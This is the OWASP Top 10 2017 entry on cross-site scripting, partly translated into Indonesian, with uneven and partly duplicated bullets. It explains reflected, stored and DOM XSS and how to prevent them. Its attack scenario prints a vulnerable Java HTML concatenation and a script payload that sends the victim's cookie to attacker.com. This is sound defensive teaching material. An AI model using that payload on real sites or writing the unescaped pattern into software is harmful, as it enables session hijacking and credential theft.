# A7:2017 Cross-Site Scripting (XSS)

| Threat agents/Attack vectors | Security Weakness           | Impacts               |
| -- | -- | -- |
| Akses Lvl: Eksploitasi 3 | Prevalensi 3 : Deteksi 3 | Teknis 2 : Bisnis |
| Tool otomatis dapat  mendeteksi dan melakukan exploit pada semua tiga type XSS, and ada Framework eksploitasi yang tersedia secara gratis. | XSS adalah kerentanan paling umum kedua di OWASP Top 10, dan  masih ditemukan di sekitar dua pertiga dari semua aplikasi. Automated tools dapat menemukan beberapa bug XSS  secara otomatis, Khususnya dalam aplikasi pemrograman seperti PHP, J2EE / JSP, dan ASP.NET. | Dampak pada XSS untuk kategori medium untuk Reflected XSS dan DOM XSS dan Kritikal untuk stored XSS, dengan eksekusi kode jarak jauh di browser korban, seperti mencuri kredensial, sesi, atau mengirimkan malware ke korban |

## Apakah Aplikasi itu Rentan?

Ada Tiga Jenis XSS, biasanya menargetkan browser pengguna:

* **Reflected XSS**: Aplikasi atau API menyertakan masukan pengguna yang tidak divalidasi dan tidak lolos sebagai bagian dari keluaran HTML. Serangan yang berhasil memungkinkan penyerang mengeksekusi HTML dan JavaScript sewenang-wenang di browser korban. Biasanya pengguna perlu berinteraksi dengan beberapa tautan berbahaya yang mengarah ke laman yang dikendalikan penyerang, seperti situs web lubang air berbahaya, iklan, atau sejenisnya
* **Stored XSS**: Aplikasi atau API menyimpan masukan pengguna yang tidak dibersihkan yang dilihat di lain waktu oleh pengguna lain atau administrator. XSS yang disimpan sering dianggap sebagai risiko tinggi atau kritis.
* **DOM XSS**: Kerangka kerja JavaScript, aplikasi halaman tunggal, dan API yang secara dinamis menyertakan data yang dapat dikontrol penyerang ke halaman rentan terhadap DOM XSS. Idealnya, aplikasi tidak akan mengirim data yang dapat dikontrol penyerang ke JavaScript API yang tidak aman.
Serangan XSS termasuk pencurian sesi user, account takeover, MFA bypass_, _DOM node replacement_ atau merubah tampilan website target (seperti panel login trojan), 
serangan terhadap browser pengguna seperti unduhan perangkat lunak berbahaya, pencatatan log kunci, dan serangan sisi klien lainnya.

## Bagaimana Cara Pencegahannya

Pencegahan XSS membutuhkan pemisahan pada data yang tidak terpecaya dari konten browser yang aktif. Ini dapat dicapai dengan:

* Menggunakan kerangka kerja yang secara otomatis lolos dari XSS berdasarkan desain, seperti Ruby on Rails terbaru, React JS. Pelajari batasan perlindungan XSS setiap framework dan tangani kasus penggunaan yang tidak tercakup dengan tepat.
* Meloloskan data permintaan HTTP yang tidak tepercaya berdasarkan konteks di Output HTML (_body, attribute, JavaScript, CSS, atau URL)_ akan menutup celah Reflected and Stored XSS.emiliki detail tentang teknik pelolosan data yang diperlukan.
*  Reflected dan Stored XSS. The [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) emiliki detail tentang teknik pelolosan data yang diperlukan.
* Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS Prevention'.
* Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).

## Example Attack Scenario

**Scenario #1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
The attacker modifies the ‘CC’ parameter in the browser to:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.

## References

### OWASP

* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### External

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
